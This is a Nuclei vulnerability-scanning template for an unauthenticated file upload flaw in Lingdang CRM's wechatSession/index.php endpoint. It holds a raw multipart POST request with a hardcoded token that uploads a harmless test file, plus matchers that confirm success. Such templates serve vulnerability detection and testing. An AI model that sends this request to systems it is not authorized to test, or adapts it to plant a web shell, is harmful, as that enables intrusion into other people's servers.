id: lingdangCRM-wechatSession-upload

info:
  name: 灵当CRM wechatSession/index.php接口处存在文件上传漏洞
  author: lingdangCRM
  severity: high
  tags: lingdangCRM
  
http:
  - raw:
      - |
        POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: multipart/form-data; boundary=----9f57d14038b72104f2b6fafebf51c117
        
        ------9f57d14038b72104f2b6fafebf51c117
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.txt"
        Content-Type: image/jpeg
        
        364994847804
        ------9f57d14038b72104f2b6fafebf51c117--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{randstr}}.txt"
          - "upload_status"
        part: body
        condition: and
      - type: status
        status: 
          - 200
